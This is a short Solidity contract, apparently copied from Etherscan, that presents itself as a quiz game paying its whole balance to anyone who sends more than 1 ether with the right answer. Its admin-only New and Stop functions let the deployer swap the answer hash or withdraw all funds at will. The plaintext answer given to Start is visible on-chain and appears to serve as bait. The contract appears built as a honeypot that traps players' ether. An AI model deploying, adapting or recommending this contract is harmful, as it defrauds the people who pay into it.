/**
 *Submitted for verification at Etherscan.io on 2021-04-05
*/

/**
 *Submitted for verification at Etherscan.io on 2021-04-04
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
contract Ri_Game
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping (address=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() {
            admin[msg.sender] = true;
    }

    modifier isAdmin(){
        require(admin[msg.sender]);
        _;
    }

    fallback() external {}
}